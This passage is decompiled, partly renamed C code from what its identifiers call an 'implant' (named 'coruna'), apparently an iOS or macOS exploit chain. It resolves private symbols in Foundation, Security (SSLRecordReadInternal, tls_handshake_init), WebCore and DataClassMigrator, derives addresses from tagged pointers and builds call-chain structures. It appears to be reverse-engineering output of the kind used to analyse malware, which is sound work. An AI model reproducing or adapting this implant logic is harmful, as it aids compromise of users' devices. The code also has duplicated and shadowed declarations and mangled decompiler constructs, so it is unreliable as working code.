    block_ctx = "_CFRunLoopObserverCreateWithHandler";
    thread_attr = 0;
    str = (uint64_t *)coruna_implant41e4_via_cat_4(copy,&serial_buf);
    str[1] = action;
    *str = coruna_u64_pack((bootargs), (serial_buf));
    str[3] = thread_attr;
    str[2] = block_ctx;
    handle = coruna_dlclose_ccdc("/System/Library/Frameworks/Foundation.framework/Foundation",
                          "____NSExtensionContextVendorClass_block_invoke");
    if (handle != 0xffff1102888122) {
      type_id_8 = *(uint64_t *)(handle + 0x28);
      tag = *(uint64_t *)(handle + 0x20U);
      err = coruna_cat((byte)((unsigned long)tag >> 0x18) & (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x18),
                       coruna_cat((byte)((unsigned long)tag >> 0x10) & (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x10),
                                coruna_cat((byte)((unsigned long)tag >> 8) &
                                         (byte)((unsigned long)k_implant_md5_mix_word_a >> 8),
                                         (byte)tag & (byte)k_implant_md5_mix_word_a)));
      status = coruna_cat((byte)((unsigned long)type_id_8 >> 0x18) & (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x18),
                        coruna_cat((byte)((unsigned long)type_id_8 >> 0x10) &
                                 (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x10),
                                 coruna_cat((byte)((unsigned long)type_id_8 >> 8) &
                                          (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 8),
                                          (byte)type_id_8 & (byte)k_implant_insn_word_0000eb18)));
      if (((!(bool)(~(err == (int)k_implant_md5_mix_word_b) & 1) &&
           !(bool)(~((int)(coruna_cat((byte)((unsigned long)tag >> 0x38) &
                                    (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x38),
                                    coruna_cat((byte)((unsigned long)tag >> 0x30) &
                                             (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x30),
                                             coruna_cat((byte)((unsigned long)tag >> 0x28) &
                                                      (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x28),
                                                      coruna_u64_pack14(((byte)((unsigned long)tag >> 0x20) &
                                                               (byte)((unsigned long)k_implant_md5_mix_word_a >> 0x20)), (err))))) >> 0x20) ==
                    (int)((unsigned long)k_implant_md5_mix_word_b >> 0x20)) & 1)) &&
          !(bool)(~(status == (int)k_implant_insn_word_0000eb28) & 1)) &&
          !(bool)(~((int)(coruna_cat((byte)((unsigned long)type_id_8 >> 0x38) &
                                   (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x38),
                                   coruna_cat((byte)((unsigned long)type_id_8 >> 0x30) &
                                            (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x30),
                                            coruna_cat((byte)((unsigned long)type_id_8 >> 0x28) &
                                                     (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x28),
                                                     coruna_u64_pack14(((byte)((unsigned long)type_id_8 >> 0x20) &
                                                              (byte)((unsigned long)k_implant_insn_word_0000eb18 >> 0x20)), (status))))) >> 0x20) ==
                   (int)((unsigned long)k_implant_insn_word_0000eb28 >> 0x20)) & 1)) {
        base = (handle + 0x20U & 0xfffffffffffff000) + (unsigned long)((uint)tag >> 0x11 & 0x3000) +
                 (unsigned long)((uint)tag >> 5 & 0x7ffff) * 0x4000 +
                 (unsigned long)((uint)((unsigned long)tag >> 0x27) & 0x7ff8);
      }
    }
    scratch = 0;
    bootargs = "/System/Library/Frameworks/Foundation.framework/Foundation";
    thread_attr = "____NSExtensionContextVendorClass_block_invoke";
    host_info = base;
    copy = (uint64_t *)coruna_implant41e4_via_cat_4(copy,&scratch);
    copy[1] = bootargs;
    *copy = coruna_u64_pack((scratch), (scratch));
    copy[3] = host_info;
    copy[2] = thread_attr;
    err = true;
  }
  str = (long *)ptr[7];
  if (str != (long *)0x0) {
    block = (uint32_t *)0x0;
    data = (uint32_t *)0x0;
    buf = (void *)0x0;
    do {
      obj = data;
      ptr = buf;
      if (str[6] == 0xffff1102888122) {
        if (data == block) {
          ls22 = (long)block - (long)buf;
          kind = (long)ls22 >> 2;
          u = kind + 1;
          if (u >> 0x3e != 0) {
            coruna_abort_601c();
fail:
            coruna_abort();
          }
          if (u <= (unsigned long)((long)ls22 >> 1)) {
            u = (long)ls22 >> 1;
          }
          if (0x1ffffffffffffffe < kind) {
            u = 0x3fffffffffffffff;
          }
          if (u == 0) {
            ptr = (void *)0x0;
          }
          else {
            if (u >> 0x3e != 0) goto fail;
            ptr = operator_new(u << 2);
          }
          block = (uint32_t *)((long)ptr + kind * 4);
          obj = block + 1;
          *block = (int)str[2];
          if (0 < (long)ls22) {
            _memcpy(ptr,buf,ls22);
          }
          block = (uint32_t *)((long)ptr + u * 4);
          if (buf != (void *)0x0) {
            operator_delete(buf);
          }
        }
        else {
          obj = data + 1;
          *data = (int)str[2];
        }
      }
      str = (long *)*str;
      data = obj;
      buf = ptr;
    } while (str != (long *)0x0);
    if (ptr != (void *)0x0) {
      operator_delete(ptr);
    }
  }
  if (err) {
    if ((((handle == (long *)0x0) || (*handle == 0)) || (handle[1] == 0)) ||
       ((int)handle[2] == 0)) {
      tag = 3;
    }
    else {
      coruna_macho_data_seg(&sa_new,ptr);
      tag = coruna_return_zero_6028(&sa_new);
      if (((int)tag == 0) && (tag = coruna_implant49c4_via_ret_stub(&sa_new), (int)tag == 0)) {
        coruna_implant6dec_via_vm_deallocate_3(*ptr);
      }
      coruna_implant41e4_via_dlclose(&sa_new);
    }
    coruna_implant49c4_residual_53(ptr);
  }
  else {
    coruna_implant49c4_residual_53(ptr);
    tag = 1;
  }
  if (*(long *)k_implant_stack_chk_guard_slot == plist) {
    return tag;
  }
  ___stack_chk_fail();
}





void coruna_implant49c4_residual_53(void *ctx)
{
  if (ctx != (void *)0x0) {
    if (*(void **)((long)ctx + 0x10) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x10));
    }
    if (*(void **)((long)ctx + 8) != (void *)0x0) {
      _free(*(void **)((long)ctx + 8));
    }
    coruna_implant41e4_via_implant6dec_residual_87((long)ctx + 0x78);
    coruna_implant41e4_via_implant6dec_residual_87((long)ctx + 0x50);
    coruna_implant41e4_residual_6((long)ctx + 0x28);
    operator_delete(ctx);
    return;
  }
  return;
}
void coruna_implant49c4_via_memcpy_7be8_8df0_2(uint64_t val)
{
  uint64_t u;
  uint8_t *ptr;
  uint64_t size;
  void *ptr;
  long handle;
  uint64_t *scratch;
  uint64_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  uint64_t *block_ctx;
  uint64_t *stack_guard;
  uint64_t *sa_saved;
  uint64_t *sa_new;
  uint64_t *path_buf;
  uint64_t *tmp_buf;
  uint32_t region[2];
  uint8_t plist[24];
  uint32_t url_buf;
  uint8_t json_buf[24];
  uint32_t frame;
  uint8_t work[24];
  uint32_t cache;
  long cache_20 [4];
  
  cache_20[3] = *(long *)k_implant_stack_chk_guard_slot;
  sa_new = operator_new(0xa0);
  size = k_implant_rodata_word_000107a8;
  ptr = PTR_s__OBJC_CLASS___DataClassMigrator_000107a0;
  u = k_implant_import_slot_2c;
  path_buf = sa_new + 0x14;
  sa_new[0xd] = PTR_s__System_Library_PrivateFramework_00010798;
  sa_new[0xc] = u;
  sa_new[0xf] = size;
  sa_new[0xe] = ptr;
  size = k_implant_rodata_word_000107c8;
  ptr = PTR_s__SSLRecordReadInternal_000107c0;
  u = k_implant_import_slot_2d;
  sa_new[0x11] = PTR_s__System_Library_Frameworks_Secur_000107b8;
  sa_new[0x10] = u;
  sa_new[0x13] = size;
  sa_new[0x12] = ptr;
  size = k_implant_rodata_word_00010768;
  ptr = PTR_s___ZGVZN7WebCore24FloatingPointEn_00010760;
  u = k_implant_import_slot_2a;
  sa_new[5] = PTR_s__System_Library_PrivateFramework_00010758;
  sa_new[4] = u;
  sa_new[7] = size;
  sa_new[6] = ptr;
  size = k_implant_rodata_word_00010788;
  ptr = PTR_s__softLinkEXGetExtensionContextIn_00010780;
  u = k_implant_import_slot_2b;
  sa_new[9] = PTR_s__System_Library_Frameworks_Found_00010778;
  sa_new[8] = u;
  sa_new[0xb] = size;
  sa_new[10] = ptr;
  size = k_implant_rodata_word_00010748;
  ptr = PTR_s__rng_00010740;
  u = k_implant_import_slot_29;
  sa_new[1] = PTR_s__usr_lib_system_libsystem_c_dyli_00010738;
  *sa_new = u;
  sa_new[3] = size;
  sa_new[2] = ptr;
  region[0] = 0;
  tmp_buf = path_buf;
  coruna_memcpy_7be8_8df0(plist,&sa_new);
  block_ctx = operator_new(0x40);
  size = k_implant_rodata_word_000107e8;
  ptr = PTR_s__tls_handshake_init_pending_ciph_000107e0;
  u = k_implant_import_slot_2e;
  stack_guard = block_ctx + 8;
  block_ctx[1] = PTR_s__System_Library_Frameworks_Secur_000107d8;
  *block_ctx = u;
  block_ctx[3] = size;
  block_ctx[2] = ptr;
  size = k_implant_rodata_word_00010808;
  ptr = PTR_s__SSLRecordReadInternal_00010800;
  u = k_implant_import_slot_2f;
  block_ctx[5] = PTR_s__System_Library_Frameworks_Secur_000107f8;
  block_ctx[4] = u;
  block_ctx[7] = size;
  block_ctx[6] = ptr;
  url_buf = 1;
  sa_saved = stack_guard;
  coruna_memcpy_7be8_8df0(json_buf,&block_ctx);
  host_info = operator_new(0x20);
  size = k_implant_rodata_word_00010828;
  ptr = PTR_s_____NSExtensionContextInternalCl_00010820;
  u = k_implant_import_slot_30;
  serial_buf = host_info + 4;
  host_info[1] = PTR_s__System_Library_Frameworks_Found_00010818;
  *host_info = u;
  host_info[3] = size;
  host_info[2] = ptr;
  frame = 2;
  action = serial_buf;
  coruna_memcpy_7be8_8df0(work,&host_info);
  scratch = operator_new(0x20);
  size = k_implant_rodata_word_00010848;
  ptr = PTR_s_dataClassMigratorForBundleAtPath_00010840;
  u = k_implant_import_slot_31;
  bootargs = scratch + 4;
  scratch[1] = PTR_s__System_Library_PrivateFramework_00010838;
  *scratch = u;
  scratch[3] = size;
  scratch[2] = ptr;
  cache = 3;
  thread_attr = bootargs;
  coruna_memcpy_7be8_8df0(cache_20,&scratch);
  coruna_implant49c4_via_cat(val,region,4);
  handle = 0;
  do {
    ptr = *(void **)((long)cache_20 + handle);
    if (ptr != (void *)0x0) {
      *(void **)((long)cache_20 + handle + 8) = ptr;
      operator_delete(ptr);
    }
    handle = handle + -0x20;
  } while (handle != -0x80);
  if (scratch != (uint64_t *)0x0) {
    bootargs = scratch;
    operator_delete(scratch);
  }
  if (host_info != (uint64_t *)0x0) {
    serial_buf = host_info;
    operator_delete(host_info);
  }
  if (block_ctx != (uint64_t *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (sa_new != (uint64_t *)0x0) {
    path_buf = sa_new;
    operator_delete(sa_new);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == cache_20[3]) {
    return;
  }
  ___stack_chk_fail();
}





uint64_t coruna_implant49c4_via_implant6dec_residual_82(long handle,uint64_t val)
{
  uint64_t u;
  uint32_t *ptr;
  uint64_t size;
  uint32_t version;
  long handle;
  uint32_t *buf;
  uint32_t *str;
  long *ptr;
  void (*ptr)(void);
  
  ptr = *(long **)(handle + 0x10);
  do {
    if (ptr == (long *)0x0) {
      return 1;
    }
    str = (uint32_t *)ptr[3];
    ptr = (uint32_t *)ptr[4];
    if (ptr != str) {
      if (3 < *(uint *)(ptr + 2)) {
fail:
        coruna_implant6dec_residual_82(val);
        return 0;
      }
      ptr = (void (*)(&ptr_implant49c4_fn_10850)[(int)*(uint *)(ptr + 2)];
      do {
        handle = (*ptr)(*(uint64_t *)(str + 2),*(uint64_t *)(str + 4));
        if (handle == 0xffff1102888122) goto fail;
        version = *str;
        u = *(uint64_t *)(str + 2);
        size = *(uint64_t *)(str + 4);
        buf = (uint32_t *)coruna_implant41e4_via_cat_4(val,str);
        *buf = version;
        *(uint64_t *)(buf + 2) = u;
        *(uint64_t *)(buf + 4) = size;
        *(long *)(buf + 6) = handle;
        str = str + 8;
      } while (str != ptr);
    }
    ptr = (long *)*ptr;
  } while( true );
}





long * coruna_implant41e4_via_cat_4(long *handle,uint *size)
{
  uint u;
  unsigned long size;
  unsigned long version;
  long handle;
  long *ptr;
  unsigned long port;
  long *buf;
  unsigned long tag;
  unsigned long kind;
  unsigned long unaff_x23;
  uint16_t type_id;
  uint64_t type_id_8;
  
  u = *size;
  kind = (unsigned long)u;
  tag = handle[1];
  if (tag != 0) {
    type_id_8 = coruna_cat(POPCOUNT((char)(tag >> 0x38)),
                      coruna_cat(POPCOUNT((char)(tag >> 0x30)),
                               coruna_cat(POPCOUNT((char)(tag >> 0x28)),
                                        coruna_u64_pack14((POPCOUNT((char)(tag >> 0x20))), (coruna_cat(POPCOUNT((char))(tag >> 0x18)),
                                                          coruna_cat(POPCOUNT((char)(tag >> 0x10)),
                                                                   coruna_cat(POPCOUNT((char)(tag >>
                                                                                           8)),
                                                                            POPCOUNT((char)tag))))
                                                ))));
    type_id = NEON_uaddlv(type_id_8,1);
    version = coruna_cat((int6)((unsigned long)type_id_8 >> 0x10),type_id) & 0xffffffff;
    if (version < 2) {
      unaff_x23 = (unsigned long)((int)tag - 1U & u);
    }
    else {
      unaff_x23 = kind;
      if (tag <= kind) {
        port = 0;
        if (tag != 0) {
          port = kind / tag;
        }
        unaff_x23 = kind - port * tag;
      }
    }
    buf = *(long **)(*handle + unaff_x23 * 8);
    if (buf != (long *)0x0) {
      do {
        buf = (long *)*buf;
        if (buf == (long *)0x0) goto fail;
        port = buf[1];
        if (port != kind) {
          if (version < 2) {
            port = port & tag - 1;
          }
          else if (tag <= port) {
            size = 0;
            if (tag != 0) {
              size = port / tag;
            }
            port = port - size * tag;
          }
          if (port != unaff_x23) goto fail;
        }
      } while (*(uint *)(buf + 2) != u);
      goto done;
    }
  }
fail:
  buf = operator_new(0x38);
  *(uint *)(buf + 2) = u;
  buf[4] = 0;
  buf[3] = 0;
  buf[6] = 0;
  buf[5] = 0;
  *buf = 0;
  buf[1] = kind;
  if (*(float *)(handle + 4) * (float)tag < (float)(handle[3] + 1) || tag == 0) {
    version = 1;
    if (2 < tag) {
      version = (unsigned long)((tag & tag - 1) != 0);
    }
    version = version | tag << 1;
    tag = (unsigned long)((float)(handle[3] + 1) / *(float *)(handle + 4));
    if (tag <= version) {
      tag = version;
    }
    coruna_implant49c4_via_cat_2(handle,tag);
    tag = handle[1];
    if ((tag & tag - 1) == 0) {
      unaff_x23 = (unsigned long)((int)tag - 1U & u);
    }
    else {
      unaff_x23 = kind;
      if (tag <= kind) {
        version = 0;
        if (tag != 0) {
          version = kind / tag;
        }
        unaff_x23 = kind - version * tag;
      }
    }
  }
  handle = *handle;
  ptr = *(long **)(handle + unaff_x23 * 8);
  if (ptr == (long *)0x0) {
    ptr = handle + 2;
    *buf = *ptr;
    *ptr = (long)buf;
    *(long **)(handle + unaff_x23 * 8) = ptr;
    if (*buf != 0) {
      kind = *(unsigned long *)(*buf + 8);
      if ((tag & tag - 1) == 0) {
        kind = kind & tag - 1;
      }
      else if (tag <= kind) {
        version = 0;
        if (tag != 0) {
          version = kind / tag;
        }
        kind = kind - version * tag;
      }
      *(long **)(*handle + kind * 8) = buf;
    }
  }
  else {
    *buf = *ptr;
    *ptr = (long)buf;
  }
  handle[3] = handle[3] + 1;
done:
  return buf + 3;
}





void coruna_implant6dec_residual_82(long *handle)
{
  uint64_t *ptr;
  long handle;
  long addr;
  void *ptr;
  
  if (handle[3] != 0) {
    ptr = (void *)handle[2];
    while (ptr != (void *)0x0) {
      ptr = (void *)*ptr;
      operator_delete(ptr);
      ptr = ptr;
    }
    handle[2] = 0;
    handle = handle[1];
    if (handle != 0) {
      addr = 0;
      do {
        *(uint64_t *)(*handle + addr * 8) = 0;
        addr = addr + 1;
      } while (handle != addr);
    }
    handle[3] = 0;
  }
  return;
}





void coruna_implant49c4_via_cat_2(long handle,unsigned long arg)
{
  unsigned long u;
  unsigned long size;
  uint16_t version;
  uint64_t port;
  
  if (arg - 1 == 0) {
    arg = 2;
  }
  else if ((arg & arg - 1) != 0) {
    arg = std___next_prime(arg);
  }
  size = *(unsigned long *)(handle + 8);
  u = arg;
  if (arg <= size) {
    if (arg < size) {
      u = (unsigned long)((float)*(unsigned long *)(handle + 0x18) / *(float *)(handle + 0x20));
      if ((size < 3) ||
         (port = coruna_cat(POPCOUNT((char)(size >> 0x38)),
                           coruna_cat(POPCOUNT((char)(size >> 0x30)),
                                    coruna_cat(POPCOUNT((char)(size >> 0x28)),
                                             coruna_u64_pack14((POPCOUNT((char)(size >> 0x20))), (coruna_cat(POPCOUNT((char))(size >> 0x18)),
                                                               coruna_cat(POPCOUNT((char)(size >> 
                                                  0x10)),coruna_cat(POPCOUNT((char)(size >> 8)),
                                                                  POPCOUNT((char)size)))))))),
         version = NEON_uaddlv(port,1), 1 < (uint)coruna_cat((int6)((unsigned long)port >> 0x10),version))) {
        u = std___next_prime(u);
      }
      else if (1 < u) {
        u = 1L << (-LZCOUNT(u - 1) & 0x3fU);
      }
      if (u <= arg) {
        u = arg;
      }
      if (u < size) goto fail;
    }
    return;
  }
fail:
  coruna_implant41e4_via_cat_3(handle,u);
  return;
}





void coruna_abort(void)
{
  _abort();
}





void coruna_implant41e4_via_cat_3(long *handle,unsigned long arg)
{
  unsigned long u;
  void *ptr;
  void *buf;
  unsigned long size;
  long *str;
  long *copy;
  long *data;
  unsigned long version;
  long *obj;
  uint16_t port;
  uint64_t tag;
  unsigned long kind;
  
  if (arg == 0) {
    ptr = (void *)*handle;
    *handle = 0;
    if (ptr != (void *)0x0) {
      operator_delete(ptr);
    }
    handle[1] = 0;
  }
  else {
    if (arg >> 0x3d != 0) {
      coruna_abort();
    }
    ptr = operator_new(arg << 3);
    buf = (void *)*handle;
    *handle = (long)ptr;
    if (buf != (void *)0x0) {
      operator_delete(buf);
    }
    size = 0;
    handle[1] = arg;
    do {
      *(uint64_t *)(*handle + size * 8) = 0;
      size = size + 1;
    } while (arg != size);
    str = (long *)handle[2];
    if (str != (long *)0x0) {
      size = str[1];
      tag = coruna_cat(POPCOUNT((char)(arg >> 0x38)),
                        coruna_cat(POPCOUNT((char)(arg >> 0x30)),
                                 coruna_cat(POPCOUNT((char)(arg >> 0x28)),
                                          coruna_u64_pack14((POPCOUNT((char)(arg >> 0x20))), (coruna_cat(POPCOUNT((char))(arg >> 0x18)),
                                                            coruna_cat(POPCOUNT((char)(arg >> 0x10
                                                                                    )),
                                                                     coruna_cat(POPCOUNT((char)(
                                                  arg >> 8)),POPCOUNT((char)arg))))))));
      port = NEON_uaddlv(tag,1);
      kind = coruna_cat((int6)((unsigned long)tag >> 0x10),port);
      if ((kind & 0xffffffff) < 2) {
        size = size & arg - 1;
      }
      else if (arg <= size) {
        version = 0;
        if (arg != 0) {
          version = size / arg;
        }
        size = size - version * arg;
      }
      *(long **)(*handle + size * 8) = handle + 2;
      if ((long *)*str != (long *)0x0) {
        copy = (long *)*str;
        do {
          version = copy[1];
          if ((kind & 0xffffffff) < 2) {
            version = version & arg - 1;
          }
          else if (arg <= version) {
            u = 0;
            if (arg != 0) {
              u = version / arg;
            }
            version = version - u * arg;
          }
          if (version != size) {
            data = copy;
            if (*(long *)(*handle + version * 8) == 0) {
              *(long **)(*handle + version * 8) = str;
              size = version;
            }
            else {
              do {
                obj = data;
                data = (long *)*obj;
                if (data == (long *)0x0) break;
              } while ((int)copy[2] == (int)data[2]);
              *str = (long)data;
              *obj = **(long **)(*handle + version * 8);
              **(uint64_t **)(*handle + version * 8) = copy;
              copy = str;
            }
          }
          data = (long *)*copy;
          str = copy;
          copy = data;
        } while (data != (long *)0x0);
      }
    }
  }
  return;
}





void coruna_abort_601c(void)
{
  _abort();
}





uint64_t coruna_return_zero_6028(long *handle)
{
  long *ptr;
  long *buf;
  long handle;
  long *str;
  uint64_t u;
  uint64_t size;
  long addr;
  uint64_t version;
  long *copy;
  uint64_t port;
  uint32_t scratch;
  void *bootargs;
  void *thread_attr;
  uint32_t host_info;
  void *serial_buf;
  void *action;
  long *block_ctx;
  long *stack_guard;
  long *sa_saved;
  long *sa_new;
  long *path_buf;
  long *tmp_buf;
  long *region;
  long *plist;
  long *url_buf;
  long json_buf [11];
  
  json_buf[9] = *(long *)k_implant_stack_chk_guard_slot;
  block_ctx = (long *)coruna_u64_pack((block_ctx), (0x29));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&block_ctx);
  addr = *(long *)(handle + 0x18);
  copy = handle + 0x1d;
  sa_new = (long *)coruna_u64_pack((sa_new), (0x21));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x20);
  ptr = handle + 0x1f;
  tmp_buf = (long *)((long)handle + 0x5a);
  sa_new = (long *)((long)handle + 0x4d);
  path_buf = copy;
  region = ptr;
  block_ctx = operator_new(0x20);
  stack_guard = block_ctx + 4;
  block_ctx[1] = (long)path_buf;
  *block_ctx = (long)sa_new;
  block_ctx[3] = (long)region;
  block_ctx[2] = (long)tmp_buf;
  sa_saved = stack_guard;
  coruna_memcpy_7be8(&serial_buf,&block_ctx);
  coruna_implant49c4_via_sleep(handle,&serial_buf,1);
  if (serial_buf != (void *)0x0) {
    action = serial_buf;
    operator_delete(serial_buf);
  }
  json_buf[0] = handle[0x5e];
  sa_new = handle + 0x22;
  path_buf = handle + 0x29;
  tmp_buf = handle + 0x2f;
  region = handle + 0x35;
  plist = handle + 0x3f;
  url_buf = handle + 0x43;
  str = operator_new(0x38);
  handle = 0;
  str[1] = (long)path_buf;
  *str = (long)sa_new;
  str[3] = (long)region;
  str[2] = (long)tmp_buf;
  str[5] = (long)url_buf;
  str[4] = (long)plist;
  str[6] = json_buf[0];
  do {
    u = coruna_sleep(handle,ptr);
    size = coruna_sleep(handle,*(uint64_t *)((long)str + handle));
    sa_new = (long *)coruna_u64_pack((sa_new), (8));
    addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
    coruna_implant49c4_residual_55(handle,u,size,*(uint64_t *)(addr + 0x18));
    handle = handle + 8;
  } while (handle != 0x38);
  sa_new = 0x1b;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  u = *(uint64_t *)(handle + 0x18);
  host_info = 0x2c;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  coruna_implant49c4_via_sleep_2(handle,u,*(uint64_t *)(handle + 0x18));
  u = coruna_sleep(handle,copy);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x2c));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  port = *(uint64_t *)(handle + 0x18);
  host_info = 0x31;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  version = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x35);
  coruna_implant49c4_residual_56(handle,u,port,version,size);
  sa_new = handle + 8;
  path_buf = handle + 0x1e;
  tmp_buf = (long *)((long)handle + 0x6a);
  region = handle + 0x20;
  plist = (long *)((long)handle + 0x91);
  url_buf = handle + 0x21;
  coruna_return_zero_16450(&block_ctx,&sa_new,json_buf);
  coruna_memcpy_7be8(&bootargs,&block_ctx);
  coruna_implant49c4_via_sleep(handle,&bootargs,0);
  if (bootargs != (void *)0x0) {
    thread_attr = bootargs;
    operator_delete(bootargs);
  }
  u = coruna_sleep(handle,ptr);
  size = coruna_sleep(handle,handle + 0x50);
  sa_new = 9;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,u,size,*(uint64_t *)(handle + 0x18));
  u = coruna_sleep(handle,handle + 0x51);
  host_info = 0x17;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  size = *(uint64_t *)(handle + 0x18);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),size,u);
  sa_new = 0x16;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  addr = *(long *)(handle + 0x18);
  sa_new = 0x21;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),addr + -0x18,addr + -0x38);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x21));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x30);
  sa_new = (long *)0xffffffffffffffff;
  path_buf = (long *)0xffffffffffffffff;
  region = (long *)0x0;
  tmp_buf = (long *)0x0;
  url_buf = (long *)0x0;
  plist = (long *)0x0;
  json_buf[1] = 0;
  json_buf[0] = 0;
  json_buf[3] = 0;
  json_buf[2] = 0;
  json_buf[5] = 0;
  json_buf[4] = 0;
  json_buf[7] = 0;
  json_buf[8] = 0;
  json_buf[6] = 0xffffffffffffffff;
  coruna_implant49c4_via_abort_8388(handle + 0x58,&sa_new);
  addr = handle[0x59];
  handle = coruna_sleep(handle,addr + -0x78);
  handle[0x52] = handle;
  u = coruna_sleep(handle,copy);
  size = coruna_sleep(handle,handle + 0x50);
  sa_new = 0x27;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x24;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  coruna_implant49c4_residual_57(handle,u,size,version,*(uint64_t *)(handle + 0x18),0,0);
  u = coruna_sleep(handle,copy);
  sa_new = 0xd;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x26;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x2f);
  coruna_implant49c4_residual_56(handle,u,version,port,size);
  handle[0x61] = addr + -0x78;
  host_info = 0x2a;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  sa_new = 0x21;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x20);
  sa_new = 0x1b;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  u = *(uint64_t *)(handle + 0x18);
  host_info = 0x10;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  coruna_implant49c4_via_sleep_2(handle,u,*(uint64_t *)(handle + 0x18));
  sa_new = 3;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_58(handle,*(uint64_t *)(handle + 0x18));
  host_info = 4;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  size = *(uint64_t *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x20);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,size);
  handle = coruna_sleep(handle,handle + 0x4d);
  host_info = 0x10;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  u = *(uint64_t *)(addr + 0x18);
  sa_new = 0x21;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(addr + 0x18),u,handle + -0x20);
  handle = coruna_sleep(handle,handle + 0x4f);
  host_info = 0x26;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  u = *(uint64_t *)(addr + 0x18);
  sa_new = 0x21;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(addr + 0x18),u,handle + -0x20);
  ptr = handle + 0x53;
  handle = coruna_sleep(handle,ptr);
  sa_new = 0x1f;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(addr + 0x18);
  u = coruna_sleep(handle,handle + 0x47);
  size = coruna_sleep(handle,handle + 0x29);
  coruna_implant49c4_residual_56(handle,version,handle + -0x10,u,size);
  host_info = 6;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  u = coruna_sleep(handle,(long)handle + 0xbd);
  sa_new = 0x21;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,addr + -0x10);
  host_info = 5;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  u = *(uint64_t *)(handle + 0x18);
  scratch = 0x14;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  size = *(uint64_t *)(handle + 0x18);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),size,u);
  handle = coruna_sleep(handle,(long)handle + 0xd5);
  handle[0x57] = handle;
  host_info = 0x30;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x55);
  sa_new = 0x21;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,addr + -8);
  host_info = 0x2b;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
